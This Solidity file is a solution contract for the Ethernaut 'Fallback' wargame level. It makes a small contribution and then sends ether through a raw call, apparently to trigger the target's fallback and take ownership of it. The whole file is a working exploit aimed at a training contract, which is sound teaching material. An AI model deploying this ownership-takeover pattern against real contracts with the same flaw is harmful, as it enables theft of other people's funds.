// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 01: Fallback
// https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008

contract Fallback_Hack {
  address payable fallbackInstance;
  bool hasContributed = false;

  constructor(address payable _fallbackInstance) {
    fallbackInstance = _fallbackInstance;
  }

  function contribute() public payable {
    IFallback c = IFallback(fallbackInstance);
    c.contribute{value: msg.value}();
    hasContributed = true;
  }

  function takeOwnership() public payable {
    require(hasContributed, 'Challenge contract requires a contribution before you can take ownership');
    (bool success, ) = fallbackInstance.call{ value:msg.value }("");
    require(success, 'takeOwnership(), payable call() to Fallback instance failed');
  }
}

interface IFallback {
  function contribute() external payable;
}